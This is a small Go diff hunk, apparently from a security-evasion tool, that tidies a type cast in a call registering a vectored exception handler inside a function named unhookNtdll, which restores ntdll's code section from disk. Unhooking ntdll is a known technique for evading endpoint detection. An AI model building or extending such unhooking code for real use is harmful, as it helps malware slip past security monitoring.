@@ -47,7 +47,7 @@ func vehHandler(exceptionInfo uintptr) uintptr {
 // unhookNtdll restores ntdll .text section from disk, with VEH protection.
 func unhookNtdll() string {
 	// Register VEH handler before touching ntdll
-	vehHandle, _, _ := procAddVectoredExceptionHandler.Call(1, uintptr(syscall.NewCallback(vehHandler)))
+	vehHandle, _, _ := procAddVectoredExceptionHandler.Call(1, syscall.NewCallback(vehHandler))
 	if vehHandle == 0 {
 		return "VEH Unhook: failed to register VEH handler"
 	}
